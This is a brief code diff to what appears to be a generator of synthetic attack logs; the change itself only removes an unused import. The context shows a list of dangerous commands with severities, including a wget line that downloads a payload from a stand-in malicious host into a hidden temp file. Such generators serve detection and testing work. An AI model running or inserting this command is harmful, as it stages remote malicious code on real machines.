@@ -1,6 +1,6 @@
 import random
 from datetime import datetime, timezone, timedelta
-from utils.ip_pool import get_attacker_ip, get_hostname, get_trusted_ip
+from utils.ip_pool import get_attacker_ip, get_hostname
 
 DANGEROUS_COMMANDS = [
     ("wget http://malicious.example.com/payload.sh -O /tmp/.hidden_x", "high"),
